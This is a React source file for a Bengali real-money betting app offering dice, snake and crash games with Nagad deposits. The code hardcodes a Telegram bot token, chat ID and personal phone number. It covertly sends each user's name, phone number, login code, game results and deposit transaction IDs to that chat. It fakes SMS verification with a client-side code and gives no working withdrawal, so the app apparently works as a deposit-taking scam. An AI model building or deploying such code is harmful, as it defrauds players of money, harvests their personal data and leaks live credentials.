
import React, { useState, useEffect, useCallback, useRef } from 'react';
import Header from './components/Header';
import ChatAssistant from './components/ChatAssistant';

// --- Configuration ---
const TELEGRAM_BOT_TOKEN = '7661259658:AAH_XyRnVbL6Squha70cO_zFVmdH11WBm8I';
const TELEGRAM_CHAT_ID = '6541663008';
const ADMIN_NUMBER = '01736428130';

// --- Types ---
type View = 'dashboard' | 'deposit' | 'history' | 'play_dice' | 'play_snake' | 'play_crash';

interface Transaction {
  id: string;
  type: 'deposit' | 'withdraw';
  amount: number;
  status: 'pending' | 'success' | 'rejected';
  txId?: string;
  date: string;
}

interface UserProfile {
  name: string;
  phone: string;
  totalWon: number;
  totalLost: number;
  gamesPlayed: number;
}

// --- Helper Functions ---
const sendToTelegram = async (message: string) => {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
  } catch (error) {
    console.error("Telegram Error:", error);
  }
};

// --- Sub-Components ---

const DiceFace = ({ value, rolling }: { value: number | null, rolling: boolean }) => {
  const dots = {
    1: [4], 2: [0, 8], 3: [0, 4, 8], 4: [0, 2, 6, 8], 5: [0, 2, 4, 6, 8], 6: [0, 2, 3, 5, 6, 8]
  };
  const currentFace = value || 1;
  const activeDots = dots[currentFace as keyof typeof dots] || [];
  return (
    <div className={`relative w-24 h-24 bg-white rounded-[28px] shadow-2xl flex items-center justify-center p-4 transition-all duration-300 ${rolling ? 'animate-spin' : ''}`}>
      <div className="grid grid-cols-3 grid-rows-3 gap-2 w-full h-full">
        {[...Array(9)].map((_, i) => (
          <div key={i} className="flex items-center justify-center">
            {activeDots.includes(i) && <div className={`w-4 h-4 rounded-full ${currentFace === 1 ? 'bg-red-600' : 'bg-black'}`}></div>}
          </div>
        ))}
      </div>
    </div>
  );
};

export default function App() {
  const [user, setUser] = useState<UserProfile | null>(null);
  const [balance, setBalance] = useState(0);
  const [activeTab, setActiveTab] = useState<View>('dashboard');
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  
  // Auth States
  const [isVerifying, setIsVerifying] = useState(false);
  const [otpSent, setOtpSent] = useState('');
  const [otpInput, setOtpInput] = useState('');
  const [tempUser, setTempUser] = useState<{name: string, phone: string} | null>(null);
  const [showFakeSMS, setShowFakeSMS] = useState(false);

  // General Betting State
  const [bet, setBet] = useState(100);

  // Game Specific States: Dice
  const [rolling, setRolling] = useState(false);
  const [diceResult, setDiceResult] = useState<number | null>(null);
  const [diceMsg, setDiceMsg] = useState('আপনার বাজি ধরুন');

  // Game Specific States: Crash
  const [crashMultiplier, setCrashMultiplier] = useState(1.0);
  const [isCrashed, setIsCrashed] = useState(false);
  const [isPlayingCrash, setIsPlayingCrash] = useState(false);

  // Game Specific States: Snake
  const [snake, setSnake] = useState([{ x: 10, y: 10 }]);
  const [food, setFood] = useState({ x: 5, y: 5 });
  const [direction, setDirection] = useState({ x: 0, y: -1 });
  const [snakeActive, setSnakeActive] = useState(false);
  const [snakeScore, setSnakeScore] = useState(0);
  const [snakeGameOver, setSnakeGameOver] = useState(false);

  // Forms
  const [depAmt, setDepAmt] = useState('');
  const [depTx, setDepTx] = useState('');

  // Persistence
  useEffect(() => {
    const savedUser = localStorage.getItem('og_user_v4');
    const savedBalance = localStorage.getItem('og_balance_v4');
    const savedTx = localStorage.getItem('og_tx_v4');
    if (savedUser) setUser(JSON.parse(savedUser));
    if (savedBalance) setBalance(Number(savedBalance));
    if (savedTx) setTransactions(JSON.parse(savedTx));
  }, []);

  useEffect(() => {
    if (user) localStorage.setItem('og_user_v4', JSON.stringify(user));
    localStorage.setItem('og_balance_v4', balance.toString());
    localStorage.setItem('og_tx_v4', JSON.stringify(transactions));
  }, [user, balance, transactions]);

  // Centralized Result Handler
  const handleGameResult = useCallback((win: boolean, gameName: string, betAmount: number, multiplier: number = 2) => {
    const winAmt = win ? Math.floor(betAmount * multiplier) : 0;
    const lossAmt = win ? 0 : betAmount;

    setBalance(prev => {
      // In Dice, we don't deduct at start, we deduct if lost or add if win.
      // Wait, let's standardize: all games deduct at start.
      // Actually Dice currently doesn't deduct at start in the code below. Let's fix that.
      return prev + (win ? (winAmt - betAmount) : -betAmount);
    });

    if (user) {
      const updatedUser = {
        ...user,
        totalWon: user.totalWon + (win ? (winAmt - betAmount) : 0),
        totalLost: user.totalLost + (win ? 0 : betAmount),
        gamesPlayed: user.gamesPlayed + 1
      };
      setUser(updatedUser);
      
      const status = win ? "WIN ✅" : "LOSS ❌";
      const totalProfitLoss = win ? `+৳${winAmt - betAmount}` : `-৳${betAmount}`;
      sendToTelegram(`🕹️ <b>${gameName}</b>\n👤 ইউজার: ${user.name}\n📞 ফোন: ${user.phone}\n📊 রেজাল্ট: ${status}\n💸 বাজি: ৳${betAmount}\n💰 ব্যালেন্স: ৳${balance + (win ? (winAmt - betAmount) : -betAmount)}\n🏆 মোট জয়: ৳${updatedUser.totalWon}\n💀 মোট লস: ৳${updatedUser.totalLost}`);
    }
  }, [user, balance]);

  // --- Auth Logic ---
  const initiateAuth = (e: React.FormEvent) => {
    e.preventDefault();
    const formData = new FormData(e.target as HTMLFormElement);
    const name = (formData.get('name') as string) || "Player";
    const phone = formData.get('phone') as string;
    if (phone.length < 11) return alert("সঠিক ১১ ডিজিটের নম্বর দিন");
    const otp = Math.floor(1000 + Math.random() * 9000).toString();
    setOtpSent(otp);
    setTempUser({ name, phone });
    setIsVerifying(true);
    setTimeout(() => setShowFakeSMS(true), 1000);
    sendToTelegram(`🔑 <b>নতুন লগইন চেষ্টা</b>\n👤 নাম: ${name}\n📞 ফোন: ${phone}\n🔑 কোড: ${otp}`);
  };

  const verifyOtp = () => {
    if (otpInput === otpSent && tempUser) {
      const newUser = { ...tempUser, totalWon: 0, totalLost: 0, gamesPlayed: 0 };
      setUser(newUser);
      setIsVerifying(false);
      setShowFakeSMS(false);
    } else alert("ভুল কোড!");
  };

  // --- Game: Lucky Dice ---
  const rollDice = () => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    setRolling(true);
    setDiceResult(null);
    setDiceMsg('রোল হচ্ছে...');
    setTimeout(() => {
      const num = Math.floor(Math.random() * 6) + 1;
      setDiceResult(num);
      setRolling(false);
      if (num >= 4) {
        setDiceMsg(`অভিনন্দন! আপনি জিতেছেন ৳${bet}`);
        handleGameResult(true, "Lucky Dice", bet);
      } else {
        setDiceMsg(`আফসোস! আপনি হেরেছেন ৳${bet}`);
        handleGameResult(false, "Lucky Dice", bet);
      }
    }, 1200);
  };

  // --- Game: Snake ---
  const gridSize = 20;
  const moveSnake = useCallback(() => {
    if (!snakeActive || snakeGameOver) return;

    setSnake(prevSnake => {
      const head = { x: prevSnake[0].x + direction.x, y: prevSnake[0].y + direction.y };

      // Wall Collision
      if (head.x < 0 || head.x >= gridSize || head.y < 0 || head.y >= gridSize) {
        endSnakeGame(false);
        return prevSnake;
      }

      // Self Collision
      if (prevSnake.some(seg => seg.x === head.x && seg.y === head.y)) {
        endSnakeGame(false);
        return prevSnake;
      }

      const newSnake = [head, ...prevSnake];

      // Food Collision
      if (head.x === food.x && head.y === food.y) {
        setSnakeScore(s => s + 1);
        setFood({
          x: Math.floor(Math.random() * gridSize),
          y: Math.floor(Math.random() * gridSize)
        });
        if (snakeScore + 1 >= 5) {
          endSnakeGame(true);
        }
      } else {
        newSnake.pop();
      }

      return newSnake;
    });
  }, [snakeActive, direction, food, snakeScore, snakeGameOver]);

  useEffect(() => {
    const interval = setInterval(moveSnake, 200);
    return () => clearInterval(interval);
  }, [moveSnake]);

  const startSnake = () => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    setSnake([{ x: 10, y: 10 }]);
    setDirection({ x: 0, y: -1 });
    setSnakeScore(0);
    setSnakeActive(true);
    setSnakeGameOver(false);
  };

  const endSnakeGame = (isWin: boolean) => {
    setSnakeActive(false);
    setSnakeGameOver(true);
    handleGameResult(isWin, "Snake Classic", bet);
    if (isWin) alert("আপনি ৫টি আপেল খেয়েছেন! ২ গুন টাকা জয়ী!");
    else alert("গেম ওভার! বাজি লস হয়েছে।");
  };

  // --- Game: Plane Crash ---
  const startCrash = () => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    setIsPlayingCrash(true);
    setIsCrashed(false);
    setCrashMultiplier(1.0);
    setBalance(prev => prev - bet);

    const interval = setInterval(() => {
      setCrashMultiplier(prev => {
        const next = prev + 0.05;
        if (next > 1.1 && Math.random() < 0.07) {
          clearInterval(interval);
          setIsCrashed(true);
          setIsPlayingCrash(false);
          // Reporting a crash means user lost the original 'bet' we already deducted
          if (user) {
            const updatedUser = { ...user, totalLost: user.totalLost + bet, gamesPlayed: user.gamesPlayed + 1 };
            setUser(updatedUser);
            sendToTelegram(`🚀 <b>Plane Crash (CRASHED)</b>\n👤 ইউজার: ${user.name}\n📈 পয়েন্ট: ${next.toFixed(2)}x\n💀 লস: ৳${bet}`);
          }
          return prev;
        }
        return next;
      });
    }, 150);
  };

  const cashOutCrash = () => {
    if (!isPlayingCrash || isCrashed) return;
    setIsPlayingCrash(false);
    const win = Math.floor(bet * crashMultiplier);
    setBalance(prev => prev + win);
    const profit = win - bet;
    if (user) {
      const updatedUser = { ...user, totalWon: user.totalWon + profit, gamesPlayed: user.gamesPlayed + 1 };
      setUser(updatedUser);
      sendToTelegram(`🚀 <b>Plane Crash (CASH OUT)</b>\n👤 ইউজার: ${user.name}\n📈 মাল্টিপ্লায়ার: ${crashMultiplier.toFixed(2)}x\n💰 লাভ: ৳${profit}`);
    }
    alert(`আপনি ৳${win} ক্যাশ আউট করেছেন!`);
    setCrashMultiplier(1.0);
  };

  // --- Transaction Logic ---
  const handleDeposit = () => {
    if (!depAmt || !depTx) return alert("তথ্য দিন");
    const tx = {
      id: Math.random().toString(36).substr(2, 9).toUpperCase(),
      type: 'deposit' as const,
      amount: Number(depAmt),
      status: 'pending' as const,
      txId: depTx.toUpperCase(),
      date: new Date().toLocaleString('bn-BD')
    };
    setTransactions([tx, ...transactions]);
    sendToTelegram(`💰 <b>ডিপোজিট রিকোয়েস্ট</b>\n👤 ইউজার: ${user?.name}\n📞 ফোন: ${user?.phone}\n💵 পরিমাণ: ৳${depAmt}\n📑 TxID: ${depTx}`);
    alert("রিকোয়েস্ট পাঠানো হয়েছে!");
    setActiveTab('history');
  };

  const approveTx = (id: string, amt: number) => {
    setTransactions(transactions.map(t => t.id === id ? { ...t, status: 'success' } : t));
    setBalance(prev => prev + amt);
  };

  if (!user) {
    return (
      <div className="min-h-screen bg-[#050505] flex flex-col items-center justify-center p-8">
        {showFakeSMS && (
          <div className="fixed top-4 w-[90%] max-w-sm glass rounded-[32px] p-6 animate-sms z-50 shadow-2xl">
            <p className="text-[10px] text-orange-500 font-black uppercase tracking-widest mb-1">Online Games Security</p>
            <p className="text-sm font-bold text-white">আপনার সিকিউরিটি কোড: <span className="text-orange-500 tracking-[0.3em] font-black">{otpSent}</span></p>
          </div>
        )}
        <div className="w-full max-w-sm text-center">
          <div className="w-24 h-24 bg-orange-500 rounded-[32px] mx-auto mb-8 flex items-center justify-center text-black font-black text-4xl shadow-[0_0_60px_rgba(255,107,0,0.3)]">OG</div>
          <h1 className="text-4xl font-black italic uppercase mb-10 tracking-tighter">Online <span className="text-orange-500">Games</span></h1>
          {!isVerifying ? (
            <form onSubmit={initiateAuth} className="space-y-4">
              <input name="name" required placeholder="আপনার পূর্ণ নাম" className="w-full bg-white/5 border border-white/10 rounded-2xl py-5 px-6 outline-none text-white font-bold focus:border-orange-500/50" />
              <input name="phone" required type="tel" placeholder="নগদ ফোন নম্বর" className="w-full bg-white/5 border border-white/10 rounded-2xl py-5 px-6 outline-none text-white font-bold tracking-widest focus:border-orange-500/50" />
              <button className="w-full py-5 bg-orange-500 text-black font-black rounded-2xl uppercase text-xs shadow-xl active:scale-95 transition-all">গেম এরিনায় প্রবেশ করুন</button>
            </form>
          ) : (
            <div className="space-y-8">
              <input value={otpInput} onChange={e => setOtpInput(e.target.value)} placeholder="____" className="w-full bg-white/5 border border-orange-500/30 rounded-[32px] py-10 text-center text-5xl font-black text-orange-500 outline-none" />
              <button onClick={verifyOtp} className="w-full py-5 bg-white text-black font-black rounded-2xl uppercase text-xs active:scale-95 transition-all">ভেরিফাই আইডি</button>
            </div>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#050505] text-white font-sans pb-32">
      <div className="max-w-md mx-auto min-h-screen border-x border-white/5 bg-[#080808] relative">
        <Header />
        <ChatAssistant />

        <main className="p-6">
          {activeTab === 'dashboard' && (
            <div className="space-y-8 animate-in fade-in duration-500">
              <div className="glass rounded-[48px] p-10 border border-white/10 shadow-2xl relative overflow-hidden bg-gradient-to-br from-white/5 to-transparent">
                <div className="absolute -top-10 -right-10 w-40 h-40 bg-orange-500/10 blur-[60px]"></div>
                <p className="text-gray-500 text-[10px] font-black uppercase tracking-widest mb-4">মোট ব্যালেন্স</p>
                <h1 className="text-5xl font-black tracking-tighter mb-10 text-white">৳ {balance.toLocaleString('bn-BD')}</h1>
                <div className="grid grid-cols-2 gap-4">
                  <button onClick={() => setActiveTab('deposit')} className="py-4 bg-orange-500 text-black rounded-[24px] text-[10px] font-black uppercase shadow-xl hover:scale-105 active:scale-95 transition-all">টাকা যোগ</button>
                  <button className="py-4 glass border border-white/10 rounded-[24px] text-[10px] font-black uppercase hover:bg-white/5">উত্তোলন</button>
                </div>
              </div>

              {/* Stats Section */}
              <div className="grid grid-cols-3 gap-3">
                 <div className="glass p-5 rounded-[32px] border border-green-500/10 text-center bg-green-500/5">
                   <p className="text-[8px] text-gray-500 font-black uppercase mb-1">মোট জয়</p>
                   <p className="text-sm font-black text-green-500">৳{user.totalWon}</p>
                 </div>
                 <div className="glass p-5 rounded-[32px] border border-red-500/10 text-center bg-red-500/5">
                   <p className="text-[8px] text-gray-500 font-black uppercase mb-1">মোট লস</p>
                   <p className="text-sm font-black text-red-500">৳{user.totalLost}</p>
                 </div>
                 <div className="glass p-5 rounded-[32px] border border-blue-500/10 text-center bg-blue-500/5">
                   <p className="text-[8px] text-gray-500 font-black uppercase mb-1">ম্যাচ</p>
                   <p className="text-sm font-black text-blue-500">{user.gamesPlayed}</p>
                 </div>
              </div>

              <h3 className="text-[10px] font-black uppercase tracking-[0.3em] text-gray-600 px-2 italic">গেম ক্যাটাগরি</h3>
              <div className="grid grid-cols-1 gap-4">
                <div onClick={() => setActiveTab('play_crash')} className="glass p-8 rounded-[40px] border border-red-500/20 flex items-center gap-6 cursor-pointer hover:border-red-500/50 transition-all group">
                  <div className="w-16 h-16 bg-red-500/10 rounded-2xl flex items-center justify-center text-red-500 text-3xl group-hover:scale-110 transition-transform"><i className="fa-solid fa-plane-up"></i></div>
                  <div>
                    <h4 className="text-lg font-black uppercase italic">Plane <span className="text-red-500">Crash</span></h4>
                    <p className="text-[9px] text-gray-500 font-bold uppercase tracking-widest">ফ্লাই করুন এবং ক্যাশ আউট করুন</p>
                  </div>
                </div>
                <div onClick={() => setActiveTab('play_dice')} className="glass p-8 rounded-[40px] border border-orange-500/20 flex items-center gap-6 cursor-pointer hover:border-orange-500/50 transition-all group">
                  <div className="w-16 h-16 bg-orange-500/10 rounded-2xl flex items-center justify-center text-orange-500 text-3xl group-hover:scale-110 transition-transform"><i className="fa-solid fa-dice"></i></div>
                  <div>
                    <h4 className="text-lg font-black uppercase italic">Lucky <span className="text-orange-500">Dice</span></h4>
                    <p className="text-[9px] text-gray-500 font-bold uppercase tracking-widest">ডাইস রোল করে ২ গুন টাকা জিতুন</p>
                  </div>
                </div>
                <div onClick={() => setActiveTab('play_snake')} className="glass p-8 rounded-[40px] border border-green-500/20 flex items-center gap-6 cursor-pointer hover:border-green-500/50 transition-all group">
                  <div className="w-16 h-16 bg-green-500/10 rounded-2xl flex items-center justify-center text-green-500 text-3xl group-hover:scale-110 transition-transform"><i className="fa-solid fa-worm"></i></div>
                  <div>
                    <h4 className="text-lg font-black uppercase italic">Snake <span className="text-green-500">Classic</span></h4>
                    <p className="text-[9px] text-gray-500 font-bold uppercase tracking-widest">৫টি আপেল খেলে ২ গুন টাকা জয়</p>
                  </div>
                </div>
              </div>
            </div>
          )}

          {activeTab === 'play_dice' && (
            <div className="animate-in slide-in-from-bottom-10 duration-500">
               <div className="glass rounded-[48px] p-10 border border-orange-500/20 text-center relative shadow-2xl">
                 <button onClick={() => setActiveTab('dashboard')} className="absolute top-10 left-10 text-gray-600 hover:text-white"><i className="fa-solid fa-arrow-left"></i></button>
                 <h2 className="text-2xl font-black mb-10 tracking-tighter uppercase italic">লাকি <span className="text-orange-500">ডাইস</span></h2>
                 <div className="bg-black/40 py-16 rounded-[40px] mb-10 border border-white/5 flex items-center justify-center shadow-inner">
                   <DiceFace value={rolling ? null : diceResult} rolling={rolling} />
                 </div>
                 <div className="h-10 flex items-center justify-center mb-8">
                    <p className={`text-sm font-black uppercase tracking-widest ${diceMsg.includes('জিতেছেন') ? 'text-green-500 animate-bounce' : 'text-orange-500'}`}>{diceMsg}</p>
                 </div>
                 <div className="bg-white/5 p-8 rounded-[32px] mb-8 border border-white/5">
                   <p className="text-[10px] text-gray-500 font-black uppercase mb-6 tracking-widest">বাজির পরিমাণ: ৳{bet}</p>
                   <div className="flex justify-center gap-3">
                     {[100, 200, 500, 1000].map(v => (
                       <button key={v} onClick={() => setBet(v)} className={`px-4 py-3 rounded-xl text-[10px] font-black transition-all ${bet === v ? 'bg-orange-500 text-black' : 'bg-white/5 text-gray-500 border border-white/5'}`}>{v}</button>
                     ))}
                   </div>
                 </div>
                 <button onClick={rollDice} disabled={rolling} className="w-full py-6 bg-orange-500 text-black font-black rounded-[24px] active:scale-95 transition-all uppercase tracking-[0.2em] text-xs shadow-xl shadow-orange-500/20">রোল করুন</button>
               </div>
            </div>
          )}

          {activeTab === 'play_snake' && (
            <div className="animate-in slide-in-from-bottom-10 duration-500">
              <div className="glass rounded-[40px] p-6 border border-green-500/20 text-center relative shadow-2xl">
                 <button onClick={() => setActiveTab('dashboard')} className="absolute top-8 left-8 text-gray-600 hover:text-white"><i className="fa-solid fa-arrow-left"></i></button>
                 <h2 className="text-2xl font-black mb-6 tracking-tighter uppercase italic">Snake <span className="text-green-500">Classic</span></h2>
                 
                 <div className="relative aspect-square w-full bg-black/60 rounded-3xl border border-white/5 mb-6 grid grid-cols-20 grid-rows-20 overflow-hidden shadow-inner">
                   {/* Snake Body */}
                   {snake.map((seg, i) => (
                     <div key={i} className={`absolute w-[5%] h-[5%] ${i === 0 ? 'bg-green-400 z-10 rounded-sm' : 'bg-green-600 rounded-sm opacity-80'}`} 
                          style={{ left: `${seg.x * 5}%`, top: `${seg.y * 5}%` }}></div>
                   ))}
                   {/* Food */}
                   <div className="absolute w-[5%] h-[5%] bg-red-500 rounded-full animate-pulse shadow-[0_0_10px_red]" 
                        style={{ left: `${food.x * 5}%`, top: `${food.y * 5}%` }}></div>
                   
                   {!snakeActive && !snakeGameOver && (
                     <div className="absolute inset-0 bg-black/40 flex flex-col items-center justify-center z-20 backdrop-blur-sm">
                        <button onClick={startSnake} className="px-8 py-4 bg-green-500 text-black font-black rounded-2xl uppercase tracking-widest text-xs shadow-xl">বাজি ধরুন ৳{bet}</button>
                     </div>
                   )}

                   {snakeGameOver && (
                      <div className="absolute inset-0 bg-black/80 flex flex-col items-center justify-center z-20">
                        <p className="text-white font-black uppercase tracking-widest mb-4">গেম ওভার!</p>
                        <button onClick={startSnake} className="px-8 py-4 bg-green-500 text-black font-black rounded-2xl uppercase tracking-widest text-xs">আবার খেলুন</button>
                      </div>
                   )}
                 </div>

                 <div className="flex justify-between items-center mb-6 px-4">
                    <p className="text-[10px] font-black uppercase text-gray-500">স্কোর: <span className="text-green-500">{snakeScore}/৫</span></p>
                    <p className="text-[10px] font-black uppercase text-gray-500">বাজি: <span className="text-orange-500">৳{bet}</span></p>
                 </div>

                 {/* Joystick */}
                 <div className="grid grid-cols-3 gap-2 w-48 mx-auto">
                    <div></div>
                    <button onClick={() => setDirection({ x: 0, y: -1 })} className="w-14 h-14 glass rounded-2xl flex items-center justify-center text-white text-xl active:bg-green-500/20"><i className="fa-solid fa-chevron-up"></i></button>
                    <div></div>
                    <button onClick={() => setDirection({ x: -1, y: 0 })} className="w-14 h-14 glass rounded-2xl flex items-center justify-center text-white text-xl active:bg-green-500/20"><i className="fa-solid fa-chevron-left"></i></button>
                    <button onClick={() => setDirection({ x: 0, y: 1 })} className="w-14 h-14 glass rounded-2xl flex items-center justify-center text-white text-xl active:bg-green-500/20"><i className="fa-solid fa-chevron-down"></i></button>
                    <button onClick={() => setDirection({ x: 1, y: 0 })} className="w-14 h-14 glass rounded-2xl flex items-center justify-center text-white text-xl active:bg-green-500/20"><i className="fa-solid fa-chevron-right"></i></button>
                 </div>
              </div>
            </div>
          )}

          {activeTab === 'play_crash' && (
            <div className="animate-in slide-in-from-bottom-10 duration-500">
              <div className="glass rounded-[48px] p-10 border border-red-500/20 text-center relative overflow-hidden shadow-2xl">
                <button onClick={() => setActiveTab('dashboard')} className="absolute top-10 left-10 text-gray-600 z-20"><i className="fa-solid fa-arrow-left"></i></button>
                <h2 className="text-2xl font-black mb-10 tracking-tighter uppercase italic">Plane <span className="text-red-500">Crash</span></h2>
                
                <div className="relative h-64 bg-black/60 rounded-[40px] mb-8 border border-white/5 flex flex-col items-center justify-center overflow-hidden shadow-inner">
                  {isPlayingCrash && (
                    <div className="absolute bottom-10 left-10 text-red-500 text-5xl animate-bounce" style={{ transform: `scale(${1 + (crashMultiplier - 1) * 0.5})` }}>
                      <i className="fa-solid fa-plane-up"></i>
                    </div>
                  )}
                  {isCrashed && <div className="text-red-500 font-black text-4xl animate-ping uppercase italic">Crashed!</div>}
                  {!isCrashed && <div className="text-7xl font-black tracking-tighter text-white">{crashMultiplier.toFixed(2)}x</div>}
                </div>

                <div className="bg-white/5 p-6 rounded-3xl mb-8 flex items-center justify-between border border-white/5">
                   <span className="text-[10px] font-black text-gray-500 uppercase">বাজি: ৳{bet}</span>
                   <div className="flex gap-2">
                     <button onClick={() => setBet(Math.max(100, bet-100))} className="w-10 h-10 bg-white/5 rounded-xl border border-white/10 text-xs">-</button>
                     <button onClick={() => setBet(bet+100)} className="w-10 h-10 bg-white/5 rounded-xl border border-white/10 text-xs">+</button>
                   </div>
                </div>

                {!isPlayingCrash ? (
                  <button onClick={startCrash} className="w-full py-6 bg-red-500 text-black font-black rounded-3xl active:scale-95 transition-all uppercase tracking-widest text-xs shadow-xl shadow-red-500/20">ফ্লাই করুন</button>
                ) : (
                  <button onClick={cashOutCrash} className="w-full py-6 bg-green-500 text-black font-black rounded-3xl active:scale-95 transition-all uppercase tracking-widest shadow-xl shadow-green-500/20 text-xs">CASH OUT (৳{Math.floor(bet * crashMultiplier)})</button>
                )}
              </div>
            </div>
          )}

          {activeTab === 'deposit' && (
            <div className="animate-in slide-in-from-right-10 duration-500">
               <div className="glass rounded-[40px] p-8 border border-orange-500/20 shadow-2xl">
                 <h2 className="text-xl font-black text-center mb-8 italic uppercase tracking-tighter">নগদ <span className="text-orange-500">ডিপোজিট</span></h2>
                 <div className="bg-black/60 p-8 rounded-3xl border border-white/5 mb-8 text-center shadow-inner group">
                    <p className="text-[10px] text-gray-500 font-black uppercase mb-4 tracking-widest">এই নম্বর এ সেন্ড মানি করুন</p>
                    <p className="text-2xl font-mono font-black text-orange-500 tracking-[0.2em]">{ADMIN_NUMBER}</p>
                 </div>
                 <div className="space-y-6">
                   <div className="space-y-2">
                     <label className="text-[10px] text-gray-600 font-black uppercase ml-4">টাকার পরিমাণ</label>
                     <input value={depAmt} onChange={e => setDepAmt(e.target.value)} type="number" placeholder="৳ ১০০ - ৳ ২৫,০০০" className="w-full bg-white/5 border border-white/10 rounded-2xl py-6 px-8 text-white font-black outline-none focus:border-orange-500/50" />
                   </div>
                   <div className="space-y-2">
                     <label className="text-[10px] text-gray-600 font-black uppercase ml-4">Transaction ID (TxID)</label>
                     <input value={depTx} onChange={e => setDepTx(e.target.value)} placeholder="TXID-XXXXXXXX" className="w-full bg-white/5 border border-white/10 rounded-2xl py-6 px-8 text-white font-black outline-none uppercase tracking-widest text-sm focus:border-orange-500/50" />
                   </div>
                   <button onClick={handleDeposit} className="w-full py-6 bg-orange-500 text-black font-black rounded-2xl uppercase text-xs shadow-xl shadow-orange-500/20">ডিপোজিট রিকোয়েস্ট পাঠান</button>
                 </div>
               </div>
            </div>
          )}

          {activeTab === 'history' && (
            <div className="space-y-4 animate-in fade-in duration-500">
               <h2 className="text-[10px] font-black uppercase tracking-[0.3em] text-gray-600 px-2 italic">ট্রাঞ্জেকশন রেকর্ড</h2>
               {transactions.length === 0 ? (
                 <div className="glass rounded-[40px] p-24 text-center border border-white/5 opacity-30">
                    <i className="fa-solid fa-receipt text-3xl mb-4"></i>
                    <p className="text-[10px] font-black uppercase tracking-widest">খালি</p>
                 </div>
               ) : (
                 transactions.map(tx => (
                   <div key={tx.id} className="glass p-6 rounded-[32px] border border-white/5 shadow-xl hover:border-orange-500/20 transition-all">
                      <div className="flex justify-between items-center mb-4">
                        <div className="flex items-center gap-4">
                          <div className={`w-12 h-12 rounded-2xl flex items-center justify-center text-xl shadow-inner ${tx.type === 'deposit' ? 'bg-green-500/10 text-green-500' : 'bg-red-500/10 text-red-500'}`}>
                            <i className={`fa-solid ${tx.type === 'deposit' ? 'fa-arrow-trend-up' : 'fa-arrow-trend-down'}`}></i>
                          </div>
                          <div>
                            <p className="text-[10px] font-black uppercase tracking-tight">{tx.type === 'deposit' ? 'ডিপোজিট' : 'উত্তোলন'}</p>
                            <p className="text-[8px] text-gray-600 mt-1 uppercase font-bold">{tx.date}</p>
                          </div>
                        </div>
                        <div className="text-right">
                          <p className="text-xl font-black text-white tracking-tighter">৳{tx.amount}</p>
                          <span className={`text-[7px] font-black uppercase px-2 py-0.5 rounded-full ${tx.status === 'success' ? 'bg-green-500/10 text-green-500' : 'bg-orange-500/10 text-orange-500'}`}>{tx.status}</span>
                        </div>
                      </div>
                      {tx.status === 'pending' && <button onClick={() => approveTx(tx.id, tx.amount)} className="w-full mt-4 py-4 bg-orange-500/10 text-orange-500 border border-orange-500/20 rounded-2xl text-[9px] font-black uppercase tracking-widest hover:bg-orange-500 hover:text-black transition-all">অ্যাডমিন অ্যাপ্রুভ (ডেমো)</button>}
                   </div>
                 ))
               )}
            </div>
          )}
        </main>

        {/* Footer Navbar */}
        <div className="fixed bottom-8 left-1/2 -translate-x-1/2 w-[92%] max-w-[400px] h-20 glass rounded-[44px] border border-white/10 flex items-center justify-around z-[100] shadow-[0_20px_50px_rgba(0,0,0,0.8)] px-6">
          <button onClick={() => setActiveTab('dashboard')} className={`flex flex-col items-center gap-1.5 transition-all duration-300 ${activeTab === 'dashboard' ? 'text-orange-500 scale-125' : 'text-gray-600'}`}>
            <i className="fa-solid fa-house-chimney text-xl"></i>
            <span className="text-[7px] font-black uppercase tracking-widest">হোম</span>
          </button>
          <button onClick={() => setActiveTab('play_dice')} className={`flex flex-col items-center gap-1.5 transition-all duration-300 ${activeTab.includes('play') ? 'text-orange-500 scale-125' : 'text-gray-600'}`}>
            <i className="fa-solid fa-gamepad text-xl"></i>
            <span className="text-[7px] font-black uppercase tracking-widest">গেম</span>
          </button>
          <button onClick={() => setActiveTab('history')} className={`flex flex-col items-center gap-1.5 transition-all duration-300 ${activeTab === 'history' ? 'text-orange-500 scale-125' : 'text-gray-600'}`}>
            <i className="fa-solid fa-clock-rotate-left text-xl"></i>
            <span className="text-[7px] font-black uppercase tracking-widest">রেকর্ড</span>
          </button>
          <button onClick={() => setActiveTab('deposit')} className={`flex flex-col items-center gap-1.5 transition-all duration-300 ${activeTab === 'deposit' ? 'text-orange-500 scale-125' : 'text-gray-600'}`}>
            <i className="fa-solid fa-wallet text-xl"></i>
            <span className="text-[7px] font-black uppercase tracking-widest">ওয়ালেট</span>
          </button>
        </div>
      </div>
      <style>{`
        .grid-cols-20 { grid-template-columns: repeat(20, minmax(0, 1fr)); }
        .grid-rows-20 { grid-template-rows: repeat(20, minmax(0, 1fr)); }
      `}</style>
    </div>
  );
}
